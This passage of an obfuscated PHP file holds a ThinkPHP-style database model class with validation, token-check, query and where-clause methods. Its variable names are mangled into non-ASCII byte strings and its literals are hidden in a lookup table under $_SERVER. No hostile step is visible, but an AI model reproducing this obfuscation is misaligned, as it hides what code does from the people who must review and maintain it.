$°³µæÃ™); $°³µæÃ™ = array_keys($Ùá–·Œ[0]); $Á£ìçªå = array_shift($°³µæÃ™); $İâğóÆò = array_shift($°³µæÃ™); $ğã¹‘à = array(); $–€£Üáâ = count($÷ó“¬©); foreach ($Ùá–·Œ as $£äÔŠ¬Œ) { $ãÍƒ¨¼ = $£äÔŠ¬Œ[$Á£ìçªå]; if (2 == $–€£Üáâ) { $ğã¹‘à[$ãÍƒ¨¼] = $£äÔŠ¬Œ[$İâğóÆò]; } else { $ğã¹‘à[$ãÍƒ¨¼] = is_string($àÙ áÇÈ) ? implode($àÙ áÇÈ, $£äÔŠ¬Œ) : $£äÔŠ¬Œ; } } return $ğã¹‘à; } } else { if (!0 !== $àÙ áÇÈ) { $Ñ¢ôÙàõ[$¡¹‹ï›À[370]] = is_numeric($àÙ áÇÈ) ? $àÙ áÇÈ : 1; } if ($àÙ áÇÈ === $¡¹‹ï›À[335]) { unset($Ñ¢ôÙàõ[$¡¹‹ï›À[370]]); } $£äÔŠ¬Œ = $this->db->select($Ñ¢ôÙàõ); if (!empty($£äÔŠ¬Œ)) { if ($àÙ áÇÈ === $¡¹‹ï›À[335]) { return reset($£äÔŠ¬Œ[0]); } if (!0 !== $àÙ áÇÈ && 1 == $Ñ¢ôÙàõ[$¡¹‹ï›À[370]]) { return reset($£äÔŠ¬Œ[0]); } foreach ($£äÔŠ¬Œ as $ÆŒÃ˜Œ‡) { $ÇƒÓÊ¤‹[] = $ÆŒÃ˜Œ‡[$°³µæÃ™]; } return $ÇƒÓÊ¤‹; } } return null; } public function create($íœÑÒƒè = '', $õ­³æö• = '') { $×şˆİÑ =& $_SERVER[´‹ô¯Œ]; if (empty($íœÑÒƒè)) { $íœÑÒƒè = $_POST; } elseif (is_object($íœÑÒƒè)) { $íœÑÒƒè = get_object_vars($íœÑÒƒè); } if (empty($íœÑÒƒè) || !is_array($íœÑÒƒè)) { $this->error = think_lang($×şˆİÑ[351]); return !1; } $íœÑÒƒè = $this->parseFieldsMap($íœÑÒƒè, 0); $õ­³æö• = $õ­³æö• ? $õ­³æö• : (!empty($íœÑÒƒè[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$×şˆİÑ[353]])) { $ó”ÜûîØ = $this->options[$×şˆİÑ[353]]; unset($this->options[$×şˆİÑ[353]]); } elseif ($õ­³æö• == THINK_MODEL_INSERT && isset($this->insertFields)) { $ó”ÜûîØ = $this->insertFields; } elseif ($õ­³æö• == THINK_MODEL_UPDATE && isset($this->updateFields)) { $ó”ÜûîØ = $this->updateFields; } if (isset($ó”ÜûîØ)) { if (is_string($ó”ÜûîØ)) { $ó”ÜûîØ = explode($×şˆİÑ[50], $ó”ÜûîØ); } if (think_config($×şˆİÑ[376])) { $ó”ÜûîØ[] = think_config($×şˆİÑ[377]); } foreach ($íœÑÒƒè as $©–Î¾‡Õ => $šÌäÎë¢) { if (!in_array($©–Î¾‡Õ, $ó”ÜûîØ)) { unset($íœÑÒƒè[$©–Î¾‡Õ]); } } } if (!$this->autoValidation($íœÑÒƒè, $õ­³æö•)) { return !1; } if (!$this->autoCheckToken($íœÑÒƒè)) { $this->error = think_lang($×şˆİÑ[378]); return !1; } if ($this->autoCheckFields) { $ó”ÜûîØ = $this->getDbFields(); foreach ($íœÑÒƒè as $©–Î¾‡Õ => $šÌäÎë¢) { if (!in_array($©–Î¾‡Õ, $ó”ÜûîØ)) { unset($íœÑÒƒè[$©–Î¾‡Õ]); } elseif (MAGIC_QUOTES_GPC && is_string($šÌäÎë¢)) { $íœÑÒƒè[$©–Î¾‡Õ] = stripslashes($šÌäÎë¢); } } } $this->autoOperation($íœÑÒƒè, $õ­³æö•); $this->data = $íœÑÒƒè; return $íœÑÒƒè; } public function autoCheckToken($¿¸ÀÕü) { $Â“’äÄâ =& $_SERVER[´‹ô¯Œ]; if (isset($this->options[$Â“’äÄâ[379]]) && !$this->options[$Â“’äÄâ[379]]) { return !0; } if (think_config($Â“’äÄâ[376])) { $“í®¿á = think_config($Â“’äÄâ[377]); if (!isset($¿¸ÀÕü[$“í®¿á]) || Session::get($“í®¿á)) { return !1; } list($Ö¡ÄØ›, $û¤¬¨ºĞ) = explode($Â“’äÄâ[11], $¿¸ÀÕü[$“í®¿á]); if ($û¤¬¨ºĞ && Session::get($“í®¿á . $Â“’äÄâ[10] . $Ö¡ÄØ›) === $û¤¬¨ºĞ) { Session::remove($“í®¿á . $Â“’äÄâ[10] . $Ö¡ÄØ›); return !0; } if (think_config($Â“’äÄâ[380])) { Session::remove($“í®¿á . $Â“’äÄâ[10] . $Ö¡ÄØ›); } return !1; } return !0; } public function regex($Ê‚¸âºõ, $…úò¢Û) { $õ‹•áÜÁ =& $_SERVER[´‹ô¯Œ]; $·Ãôôòß = array($õ‹•áÜÁ[381] => $õ‹•áÜÁ[382], $õ‹•áÜÁ[383] => $õ‹•áÜÁ[384], $õ‹•áÜÁ[385] => $õ‹•áÜÁ[386], $õ‹•áÜÁ[387] => $õ‹•áÜÁ[388], $õ‹•áÜÁ[389] => $õ‹•áÜÁ[390], $õ‹•áÜÁ[391] => $õ‹•áÜÁ[392], $õ‹•áÜÁ[393] => $õ‹•áÜÁ[394], $õ‹•áÜÁ[368] => $õ‹•áÜÁ[395], $õ‹•áÜÁ[396] => $õ‹•áÜÁ[397]); if (isset($·Ãôôòß[strtolower($…úò¢Û)])) { $…úò¢Û = $·Ãôôòß[strtolower($…úò¢Û)]; } return preg_match($…úò¢Û, $Ê‚¸âºõ) === 1; } private function autoOperation(&$ğœ¡®, $Ö¾ÉÃ•ø) { $Œ’²á›¶ =& $_SERVER[´‹ô¯Œ]; if (!empty($this->options[$Œ’²á›¶[398]])) { $ƒŠùéü‡ = $this->options[$Œ’²á›¶[398]]; unset($this->options[$Œ’²á›¶[398]]); } elseif (!empty($this->_auto)) { $ƒŠùéü‡ = $this->_auto; } if (isset($ƒŠùéü‡)) { foreach ($ƒŠùéü‡ as $ŠÑ„ç·û) { if (empty($ŠÑ„ç·û[2])) { $ŠÑ„ç·û[2] = THINK_MODEL_INSERT; } if ($Ö¾ÉÃ•ø == $ŠÑ„ç·û[2] || $ŠÑ„ç·û[2] == THINK_MODEL_BOTH) { switch (trim($ŠÑ„ç·û[3])) { case $Œ’²á›¶[399]: case $Œ’²á›¶[400]: $·Í·‘ = isset($ŠÑ„ç·û[4]) ? (array) $ŠÑ„ç·û[4] : array(); if (isset($ğœ¡®[$ŠÑ„ç·û[0]])) { array_unshift($·Í·‘, $ğœ¡®[$ŠÑ„ç·û[0]]); } if ($Œ’²á›¶[399] == $ŠÑ„ç·û[3]) { $ğœ¡®[$ŠÑ„ç·û[0]] = call_user_func_array($ŠÑ„ç·û[1], $·Í·‘); } else { $ğœ¡®[$ŠÑ„ç·û[0]] = call_user_func_array(array(&$this, $ŠÑ„ç·û[1]), $·Í·‘); } break; case $Œ’²á›¶[353]: $ğœ¡®[$ŠÑ„ç·û[0]] = $ğœ¡®[$ŠÑ„ç·û[1]]; break; case $Œ’²á›¶[401]: if ($Œ’²á›¶[12] === $ğœ¡®[$ŠÑ„ç·û[0]]) { unset($ğœ¡®[$ŠÑ„ç·û[0]]); } break; case $Œ’²á›¶[402]: default: $ğœ¡®[$ŠÑ„ç·û[0]] = $ŠÑ„ç·û[1]; } if (!1 === $ğœ¡®[$ŠÑ„ç·û[0]]) { unset($ğœ¡®[$ŠÑ„ç·û[0]]); } } } } return $ğœ¡®; } protected function autoValidation($Ğò™»ã’, $¸à¾¦à) { $‘€Àå‡  =& $_SERVER[´‹ô¯Œ]; if (!empty($this->options[$‘€Àå‡ [403]])) { $®¬‡Áëî = $this->options[$‘€Àå‡ [403]]; unset($this->options[$‘€Àå‡ [403]]); } elseif (!empty($this->_validate)) { $®¬‡Áëî = $this->_validate; } if (isset($®¬‡Áëî)) { if ($this->patchValidate) { $this->error = array(); } foreach ($®¬‡Áëî as $ü©¸ŞíÅ => $å¿ğ¯È) { if (empty($å¿ğ¯È[5]) || $å¿ğ¯È[5] == THINK_MODEL_BOTH || $å¿ğ¯È[5] == $¸à¾¦à) { if (0 == strpos($å¿ğ¯È[2], $‘€Àå‡ [404]) && strpos($å¿ğ¯È[2], $‘€Àå‡ [405])) { $å¿ğ¯È[2] = think_lang(substr($å¿ğ¯È[2], 2, -1)); } $å¿ğ¯È[3] = isset($å¿ğ¯È[3]) ? $å¿ğ¯È[3] : THINK_EXISTS_VALIDATE; $å¿ğ¯È[4] = isset($å¿ğ¯È[4]) ? $å¿ğ¯È[4] : $‘€Àå‡ [406]; switch ($å¿ğ¯È[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($Ğò™»ã’, $å¿ğ¯È)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($‘€Àå‡ [12] != trim($Ğò™»ã’[$å¿ğ¯È[0]])) { if (!1 === $this->_validationField($Ğò™»ã’, $å¿ğ¯È)) { return !1; } } break; default: if (isset($Ğò™»ã’[$å¿ğ¯È[0]])) { if (!1 === $this->_validationField($Ğò™»ã’, $å¿ğ¯È)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($ğºıœ, $ ÎóãÇ‚) { if (!1 === $this->_validationFieldItem($ğºıœ, $ ÎóãÇ‚)) { if ($this->patchValidate) { $this->error[$ ÎóãÇ‚[0]] = $ ÎóãÇ‚[2]; } else { $this->error = $ ÎóãÇ‚[2]; return !1; } } return; } protected function _validationFieldItem($è¾†İÎé, $›Í®ÛÖĞ) { $Ò‰„…›— =& $_SERVER[´‹ô¯Œ]; switch (strtolower(trim($›Í®ÛÖĞ[4]))) { case $Ò‰„…›—[399]: case $Ò‰„…›—[400]: $Äå¡âåĞ = isset($›Í®ÛÖĞ[6]) ? (array) $›Í®ÛÖĞ[6] : array(); if (is_string($›Í®ÛÖĞ[0]) && strpos($›Í®ÛÖĞ[0], $Ò‰„…›—[50])) { $›Í®ÛÖĞ[0] = explode($Ò‰„…›—[50], $›Í®ÛÖĞ[0]); } if (is_array($›Í®ÛÖĞ[0])) { foreach ($›Í®ÛÖĞ[0] as $ëáß—«Ô) { $´äúñéó[$ëáß—«Ô] = $è¾†İÎé[$ëáß—«Ô]; } array_unshift($Äå¡âåĞ, $´äúñéó); } else { array_unshift($Äå¡âåĞ, $è¾†İÎé[$›Í®ÛÖĞ[0]]); } if ($Ò‰„…›—[399] == $›Í®ÛÖĞ[4]) { return call_user_func_array($›Í®ÛÖĞ[1], $Äå¡âåĞ); } else { return call_user_func_array(array(&$this, $›Í®ÛÖĞ[1]), $Äå¡âåĞ); } case $Ò‰„…›—[407]: return $è¾†İÎé[$›Í®ÛÖĞ[0]] == $è¾†İÎé[$›Í®ÛÖĞ[1]]; case $Ò‰„…›—[408]: if (is_string($›Í®ÛÖĞ[0]) && strpos($›Í®ÛÖĞ[0], $Ò‰„…›—[50])) { $›Í®ÛÖĞ[0] = explode($Ò‰„…›—[50], $›Í®ÛÖĞ[0]); } $Ë¡Ù¸€ = array(); if (is_array($›Í®ÛÖĞ[0])) { foreach ($›Í®ÛÖĞ[0] as $ëáß—«Ô) { $Ë¡Ù¸€[$ëáß—«Ô] = $è¾†İÎé[$ëáß—«Ô]; } } else { $Ë¡Ù¸€[$›Í®ÛÖĞ[0]] = $è¾†İÎé[$›Í®ÛÖĞ[0]]; } if (!empty($è¾†İÎé[$this->getPk()])) { $Ë¡Ù¸€[$this->getPk()] = array($Ò‰„…›—[409], $è¾†İÎé[$this->getPk()]); } if ($this->where($Ë¡Ù¸€)->find()) { return !1; } return !0; default: return $this->check($è¾†İÎé[$›Í®ÛÖĞ[0]], $›Í®ÛÖĞ[1], $›Í®ÛÖĞ[4]); } } public function check($ˆéºà¯ß, $ÏùÚÂ¥è, $åå¼Ô±¾ = "\x72\145\147\145\170") { $÷ùÍÁÊ› =& $_SERVER[´‹ô¯Œ]; $åå¼Ô±¾ = strtolower(trim($åå¼Ô±¾)); switch ($åå¼Ô±¾) { case $÷ùÍÁÊ›[7]: case $÷ùÍÁÊ›[410]: $¶Ú¨òĞ = is_array($ÏùÚÂ¥è) ? $ÏùÚÂ¥è : explode($÷ùÍÁÊ›[50], $ÏùÚÂ¥è); return $åå¼Ô±¾ == $÷ùÍÁÊ›[7] ? in_array($ˆéºà¯ß, $¶Ú¨òĞ) : !in_array($ˆéºà¯ß, $¶Ú¨òĞ); case $÷ùÍÁÊ›[411]: case $÷ùÍÁÊ›[412]: if (is_array($ÏùÚÂ¥è)) { $×˜Îª±ä = $ÏùÚÂ¥è[0]; $®¯Ø‹„ = $ÏùÚÂ¥è[1]; } else { list($×˜Îª±ä, $®¯Ø‹„) = explode($÷ùÍÁÊ›[50], $ÏùÚÂ¥è); } return $åå¼Ô±¾ == $÷ùÍÁÊ›[411] ? $ˆéºà¯ß >= $×˜Îª±ä && $ˆéºà¯ß <= $®¯Ø‹„ : $ˆéºà¯ß < $×˜Îª±ä || $ˆéºà¯ß > $®¯Ø‹„; case $÷ùÍÁÊ›[413]: case $÷ùÍÁÊ›[414]: return $åå¼Ô±¾ == $÷ùÍÁÊ›[413] ? $ˆéºà¯ß == $ÏùÚÂ¥è : $ˆéºà¯ß != $ÏùÚÂ¥è; case $÷ùÍÁÊ›[415]: $şÈÇ—áÅ = mb_strlen($ˆéºà¯ß, $÷ùÍÁÊ›[416]); if (strpos($ÏùÚÂ¥è, $÷ùÍÁÊ›[50])) { list($×˜Îª±ä, $®¯Ø‹„) = explode($÷ùÍÁÊ›[50], $ÏùÚÂ¥è); return $şÈÇ—áÅ >= $×˜Îª±ä && $şÈÇ—áÅ <= $®¯Ø‹„; } else { return $şÈÇ—áÅ == $ÏùÚÂ¥è; } case $÷ùÍÁÊ›[417]: list($ˆÜŠ“îÂ, $µòªÁ) = explode($÷ùÍÁÊ›[50], $ÏùÚÂ¥è); if (!is_numeric($ˆÜŠ“îÂ)) { $ˆÜŠ“îÂ = strtotime($ˆÜŠ“îÂ); } if (!is_numeric($µòªÁ)) { $µòªÁ = strtotime($µòªÁ); } return NOW_TIME >= $ˆÜŠ“îÂ && NOW_TIME <= $µòªÁ; case $÷ùÍÁÊ›[418]: return in_array(get_client_ip(), explode($÷ùÍÁÊ›[50], $ÏùÚÂ¥è)); case $÷ùÍÁÊ›[419]: return !in_array(get_client_ip(), explode($÷ùÍÁÊ›[50], $ÏùÚÂ¥è)); case $÷ùÍÁÊ›[406]: default: return $this->regex($ˆéºà¯ß, $ÏùÚÂ¥è); } } public function query($¦Î¢”‚, $Ü¹«û–Ò = false) { $Š¸§æË¶ =& $_SERVER[´‹ô¯Œ]; if (!is_bool($Ü¹«û–Ò) && !is_array($Ü¹«û–Ò)) { $Ü¹«û–Ò = func_get_args(); array_shift($Ü¹«û–Ò); } $¦Î¢”‚ = str_replace(array($Š¸§æË¶[288], $Š¸§æË¶[420]), $Š¸§æË¶[53], $¦Î¢”‚); $¦Î¢”‚ = $this->parseSql($¦Î¢”‚, $Ü¹«û–Ò); return $this->db->query($¦Î¢”‚); } public function execute($¬¥‹Ç˜ã, $Í’Ï“æĞ = false) { if (!is_bool($Í’Ï“æĞ) && !is_array($Í’Ï“æĞ)) { $Í’Ï“æĞ = func_get_args(); array_shift($Í’Ï“æĞ); } $¬¥‹Ç˜ã = $this->parseSql($¬¥‹Ç˜ã, $Í’Ï“æĞ); return $this->db->execute($¬¥‹Ç˜ã); } protected function parseSql($ªªßÈ‘, $ŒæÈĞ‡‘) { $¿ŸåÜÅÈ =& $_SERVER[´‹ô¯Œ]; if (!0 === $ŒæÈĞ‡‘) { $È¸ ˜œ± = $this->_parseOptions(); $ªªßÈ‘ = $this->db->parseSql($ªªßÈ‘, $È¸ ˜œ±); } elseif (is_array($ŒæÈĞ‡‘)) { $ŒæÈĞ‡‘ = array_map(array($this->db, $¿ŸåÜÅÈ[421]), $ŒæÈĞ‡‘); $ªªßÈ‘ = vsprintf($ªªßÈ‘, $ŒæÈĞ‡‘); } else { $ªªßÈ‘ = strtr($ªªßÈ‘, array($¿ŸåÜÅÈ[422] => $this->getTableName(), $¿ŸåÜÅÈ[423] => think_config($¿ŸåÜÅÈ[324]))); } $this->db->setModel($this->name); return $ªªßÈ‘; } public function db($»„Û¶©¹ = '', $ºÔ•Œ‘Å = '', $‹–ú±±¿ = array()) { $­ĞÅÜĞ– =& $_SERVER[´‹ô¯Œ]; if ($­ĞÅÜĞ–[12] === $»„Û¶©¹ && $this->db) { return $this->db; } static $•Ú®ùñó = array(); static $ıÀÀãã€ = array(); if (!isset($ıÀÀãã€[$»„Û¶©¹]) || isset($ıÀÀãã€[$»„Û¶©¹]) && $ºÔ•Œ‘Å && $•Ú®ùñó[$»„Û¶©¹] != $ºÔ•Œ‘Å) { if (!empty($ºÔ•Œ‘Å) && is_string($ºÔ•Œ‘Å) && !1 === strpos($ºÔ•Œ‘Å, $­ĞÅÜĞ–[8])) { $ºÔ•Œ‘Å = think_config($ºÔ•Œ‘Å); } $»„Û¶©¹ = think_guid($ºÔ•Œ‘Å); $ıÀÀãã€[$»„Û¶©¹] = Db::getInstance($ºÔ•Œ‘Å); } elseif (NULL === $ºÔ•Œ‘Å) { $ıÀÀãã€[$»„Û¶©¹]->close(); unset($ıÀÀãã€[$»„Û¶©¹]); return; } if (!empty($‹–ú±±¿)) { if (is_string($‹–ú±±¿)) { parse_str($‹–ú±±¿, $‹–ú±±¿); } foreach ($‹–ú±±¿ as $ÑÔÖ¥ => $È¬ıÂä´) { $this->setProperty($ÑÔÖ¥, $È¬ıÂä´); } } $•Ú®ùñó[$»„Û¶©¹] = $ºÔ•Œ‘Å; $this->db = $ıÀÀãã€[$»„Û¶©¹]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $¢¼¬ü¿ = get_class($this); if ($¢¼¬ü¿ == $_SERVER[´‹ô¯Œ][424]) { return $this->name; } $this->name = substr($¢¼¬ü¿, 0, -5); } return $this->name; } public function getTableName() { $©éÈĞŠ =& $_SERVER[´‹ô¯Œ]; if (empty($this->trueTableName)) { $‚·ËÚ» = !empty($this->tablePrefix) ? $this->tablePrefix : $©éÈĞŠ[12]; if (!empty($this->tableName)) { $‚·ËÚ» .= $this->tableName; } else { $‚·ËÚ» .= think_parse_name($this->name); } $this->trueTableName = strtolower($‚·ËÚ»); } return (!empty($this->dbName) ? $this->dbName . $©éÈĞŠ[10] : $©éÈĞŠ[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $œÒïŸÛ÷ =& $_SERVER[´‹ô¯Œ]; return isset($this->fields[$œÒïŸÛ÷[331]]) ? $this->fields[$œÒïŸÛ÷[331]] : $this->pk; } public function getDbFields() { $Ô•şÍÈË =& $_SERVER[´‹ô¯Œ]; if (isset($this->options[$Ô•şÍÈË[359]])) { $§ùç = $this->db->getFields($this->options[$Ô•şÍÈË[359]]); return $§ùç ? array_keys($§ùç) : !1; } if ($this->fields) { $§ùç = $this->fields; unset($§ùç[$Ô•şÍÈË[330]], $§ùç[$Ô•şÍÈË[331]], $§ùç[$Ô•şÍÈË[332]], $§ùç[$Ô•şÍÈË[329]]); return $§ùç; } return !1; } public function data($ ÎÜ“Ç” = '') { $›»¾³Ù =& $_SERVER[´‹ô¯Œ]; if ($›»¾³Ù[12] === $ ÎÜ“Ç” && !empty($this->data)) { return $this->data; } if (is_object($ ÎÜ“Ç”)) { $ ÎÜ“Ç” = get_object_vars($ ÎÜ“Ç”); } elseif (is_string($ ÎÜ“Ç”)) { parse_str($ ÎÜ“Ç”, $ ÎÜ“Ç”); } elseif (!is_array($ ÎÜ“Ç”)) { think_exception(think_lang($›»¾³Ù[351])); } $this->data = $ ÎÜ“Ç”; return $this; } public function join($£Ò÷šÙ‰) { $»Ô‚Í‹µ =& $_SERVER[´‹ô¯Œ]; if (is_array($£Ò÷šÙ‰)) { $this->options[$»Ô‚Í‹µ[362]] = $£Ò÷šÙ‰; } elseif (!empty($£Ò÷šÙ‰)) { $this->options[$»Ô‚Í‹µ[362]][] = $£Ò÷šÙ‰; } return $this; } public function union($ï«æ‰úú, $Œ”‹å¬ê = false) { $ÒùİÁ­Å =& $_SERVER[´‹ô¯Œ]; if (empty($ï«æ‰úú)) { return $this; } if ($Œ”‹å¬ê) { $this->options[$ÒùİÁ­Å[425]][$ÒùİÁ­Å[426]] = !0; } if (is_object($ï«æ‰úú)) { $ï«æ‰úú = get_object_vars($ï«æ‰úú); } if (is_string($ï«æ‰úú)) { $Ø­²ú›‚ = $ï«æ‰úú; } elseif (is_array($ï«æ‰úú)) { if (isset($ï«æ‰úú[0])) { $this->options[$ÒùİÁ­Å[425]] = array_merge($this->options[$ÒùİÁ­Å[425]], $ï«æ‰úú); return $this; } else { $Ø­²ú›‚ = $ï«æ‰úú; } } else { think_exception(think_lang($ÒùİÁ­Å[351])); } $this->options[$ÒùİÁ­Å[425]][] = $Ø­²ú›‚; return $this; } public function cache($Æ¶íÀïÊ = true, $¥­ÊË†¾ = null, $¥Ä„È¸± = '') { $½˜İ‰¿ =& $_SERVER[´‹ô¯Œ]; if (!1 !== $Æ¶íÀïÊ) { $this->options[$½˜İ‰¿[427]] = array($½˜İ‰¿[97] => $Æ¶íÀïÊ, $½˜İ‰¿[417] => $¥­ÊË†¾, $½˜İ‰¿[33] => $¥Ä„È¸±); } return $this; } public function field($íŸ¸‰±”, $¸ª–š­Ô = false) { $ÂÄÅã«× =& $_SERVER[´‹ô¯Œ]; if (!0 === $íŸ¸‰±”) { $ÂÎíÁú› = $this->getDbFields(); $íŸ¸‰±” = $ÂÎíÁú› ? $ÂÎíÁú› : $ÂÄÅã«×[223]; } elseif ($¸ª–š­Ô) { if (is_string($íŸ¸‰±”)) { $íŸ¸‰±” = explode($ÂÄÅã«×[50], $íŸ¸‰±”); } $ÂÎíÁú› = $this->getDbFields(); $íŸ¸‰±” = $ÂÎíÁú› ? array_diff($ÂÎíÁú›, $íŸ¸‰±”) : $íŸ¸‰±”; } $this->options[$ÂÄÅã«×[353]] = $íŸ¸‰±”; return $this; } public function scope($Ø Í”Ğš = '', $»„íß™¥ = NULL) { $„«ŒŒõÁ =& $_SERVER[´‹ô¯Œ]; if ($„«ŒŒõÁ[12] === $Ø Í”Ğš) { if (isset($this->_scope[$„«ŒŒõÁ[37]])) { $ß‘´ğ†ö = $this->_scope[$„«ŒŒõÁ[37]]; } else { return $this; } } elseif (is_string($Ø Í”Ğš)) { $øâ™üóŞ = explode($„«ŒŒõÁ[50], $Ø Í”Ğš); $ß‘´ğ†ö = array(); foreach ($øâ™üóŞ as $ÚÖ‚Çš÷) { if (!isset($this->_scope[$ÚÖ‚Çš÷])) { continue; } $ß‘´ğ†ö = array_merge($ß‘´ğ†ö, $this->_scope[$ÚÖ‚Çš÷]); } if (!empty($»„íß™¥) && is_array($»„íß™¥)) { $ß‘´ğ†ö = array_merge($ß‘´ğ†ö, $»„íß™¥); } } elseif (is_array($Ø Í”Ğš)) { $ß‘´ğ†ö = $Ø Í”Ğš; } if (is_array($ß‘´ğ†ö) && !empty($ß‘´ğ†ö)) { $this->options = array_merge($this->options, array_change_key_case($ß‘´ğ†ö)); } return $this; } public function where($ä·¹ƒ¦É, $öô’ÌŠª = null) { $Îì‰º» =& $_SERVER[´‹ô¯Œ]; if (!is_null($öô’ÌŠª) && is_string($ä·¹ƒ¦É)) { if (!is_array($öô’ÌŠª)) { $öô’ÌŠª = func_get_args(); array_shift($öô’ÌŠª); } $öô’ÌŠª = array_map(array($this->db, $Îì‰º»[421]), $öô’ÌŠª); $ä·¹ƒ¦É = vsprintf($ä·¹ƒ¦É, $öô’ÌŠª); } elseif (is_object($ä·¹ƒ¦É)) { $ä·¹ƒ¦É = get_object_vars($ä·¹ƒ¦É); } elseif (is_array($ä·¹ƒ¦É)) { foreach ($ä·¹ƒ¦É as $Š«À¶äö => $Ú²‡ùÚ™) { if ((is_numeric($Š«À¶äö) || !$Š«À¶äö) && is_string($Ú²‡ùÚ™)) { if (strpos($Ú²‡ùÚ™, $Îì‰º»[428]) === 0) { continue; } think_trace($Îì‰º»[429], $Îì‰º»[12], $Îì‰º»[49]); die; } } } if (is_string($ä·¹ƒ¦É) && $Îì‰º»[12] != $ä·¹ƒ¦É) { $››ãö Ê = array(); $››ãö Ê[$Îì‰º»[430]] = $ä·¹ƒ¦É; $ä·¹ƒ¦É = $››ãö Ê; } if (isset($this->options[$Îì‰º»[355]])) { $this->options[$Îì‰º»[355]] = array_merge($this->options[$Îì‰º»[355]], $ä·¹ƒ¦É); } else { $this->options[$Îì‰º»[355]] = $ä·¹ƒ¦É; } return $this; } public function limit($©©ÚìÜÂ, $—ëÌ³„ = null) { $á×ŒáÁÑ =& $_SERVER[´‹ô¯Œ]; $this->options[$á×ŒáÁÑ[370]] = is_null($—ëÌ³„) ? $©©ÚìÜÂ : $©©ÚìÜÂ . $á×ŒáÁÑ[50] . $—ëÌ³„; return $this; } public function page($óÃåéÂö, $ÅÙÓ—áÙ = null) { $´«„…“ =& $_SERVER[´‹ô¯Œ]; $this->options[$´«„…“[431]] = is_null($ÅÙÓ—áÙ) ? $óÃåéÂö : $óÃåéÂö . $´«„…“[50] . $ÅÙÓ—áÙ; return $this; } public function comment($¿£ÃÒŸ‡) { $this->options[$_SERVER[´‹ô¯Œ][432]] = $¿£ÃÒŸ‡; return $this; } public function setProperty($™æ•äõú, $ô¢ç™ú—) { if (property_exists($this, $™æ•äõú)) { $this->{$™æ•äõú} = $ô¢ç™ú—; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\144\x69\x66\171\x54\x69\x6d\x65", "\164\151\155\x65", "\151\156\163\145\162\x74\54\x75\x70\144\x61\164\145", "\x66\x75\156\x63\x74\151\x6f\156"), array("\x63\162\145\141\164\145\124\151\155\x65", "\x74\x69\x6d\x65", "\151\x6e\163\x65\162\164", "\x66\x75\156\x63\x74\x69\157\x6e")); public function setDataAuto($Ó’ŸÖÙŞ) { $this->dataAuto = $Ó’ŸÖÙŞ; } public function __construct($Ø¬öÑ¹ = '', $±Ëùæ£‘ = '', $şË§ãÇŞ = '') { parent::__construct($Ø¬öÑ¹, $±Ëùæ£‘, $şË§ãÇŞ); } protected $tableMeta = array(); protected function _beforeInsert(&$Éøöô‘Ğ, $™ï”Ğ…’) { $÷ÉùïºĞ =& $_SERVER[´‹ô¯Œ]; if (!$this->checkDataAutoHas($÷ÉùïºĞ[433])) { return; } $this->dataBeforeFilter($Éøöô‘Ğ, $÷ÉùïºĞ[433]); } protected function _beforeUpdate(&$ìÅ‡¹, $Ûòöœş) { $ÈõÁ·Éˆ =& $_SERVER[´‹ô¯Œ]; if (!$this->checkDataAutoHas($ÈõÁ·Éˆ[434])) { return; } $this->dataBeforeFilter($ìÅ‡¹, $ÈõÁ·Éˆ[434]); } protected function _afterSelect(&$»‡ü›æŒ, $Ù»ëà§•) { if (!is_array($»‡ü›æŒ)) { return; } if (!$this->checkDataAutoHas($_SERVER[´‹ô¯Œ][435])) { return; } foreach ($»‡ü›æŒ as &$¥ÈøÉ·) { $this->dataAfterFilter($¥ÈøÉ·); } unset($¥ÈøÉ·); } protected function _afterFind(&$¸÷¹‘û¾, $ËîúÄ›¶) { if (!is_array($¸÷¹‘û¾)) { return; } if (!$this->checkDataAutoHas($_SERVER[´‹ô¯Œ][435])) { return; } $this->dataAfterFilter($¸÷¹‘û¾); } public static function textEncode($çØøà½ä) { if (!$çØøà½ä) { return $çØøà½ä; } $ÁÜ÷øÆö = json_encode($çØøà½ä); $ÁÜ÷øÆö = preg_replace_callback($_SERVER[´‹ô¯Œ][436], function ($Û¿ß“‹) { return addslashes($Û¿ß“‹[0]); }, $ÁÜ÷øÆö); return json_decode($ÁÜ÷øÆö); } public static function textDecode($‘¸×´Ÿ ) { $Ü¬Ñ²“í =& $_SERVER[´‹ô¯Œ]; $òÒû¦İÁ = json_encode($‘¸×´Ÿ ); $òÒû¦İÁ = preg_replace_callback($Ü¬Ñ²“í[437], function ($Ú×éÊøË) { return $_SERVER[´‹ô¯Œ][100]; }, $òÒû¦İÁ); return json_decode($òÒû¦İÁ); } public function setAutoIncrement($êÙ§åŒù) { $ïÛöÃ´û = array($this->getPk() => $êÙ§åŒù); $¤¤âøÍò = $this->data($ïÛöÃ´û)->add(); if ($¤¤âøÍò) { $this->delete($¤¤âøÍò); } } public function getAutoIncrement() { $ØÁıâğÀ = $this->getTableName(); $—ïäÇåå = $this->max($this->getPk()); $¨ğÕ‘ÜÈ = $this->query("\x73\150\x6f\167\x20\164\x61\142\x6c\x65\x20\163\x74\141\164\165\163\x20\167\x68\145\x72\145\x20\x4e\x61\x6d\145\x3d\x27{$ØÁıâğÀ}\47"); $ĞÙä†Î„ = $¨ğÕ‘ÜÈ[0][$_SERVER[´‹ô¯Œ][438]]; $Ë—“şğ = max($—ïäÇåå, $ĞÙä†Î„); return $Ë—“şğ; } protected function _callBefore($Ó¶ßõÛ¼, $„—Éî¬—) { return $this->cacheCallCheck($Ó¶ßõÛ¼, $„—Éî¬—, !1); } protected function _callAfter($«ü¯³û, $ŠÉÖüœ ) { return $this->cacheCallCheck($«ü¯³û, $ŠÉÖüœ , !0); } protected function cacheFunctionAlias($ÖæğÀˆ¢) { return !1; } public function cacheMemory() { return 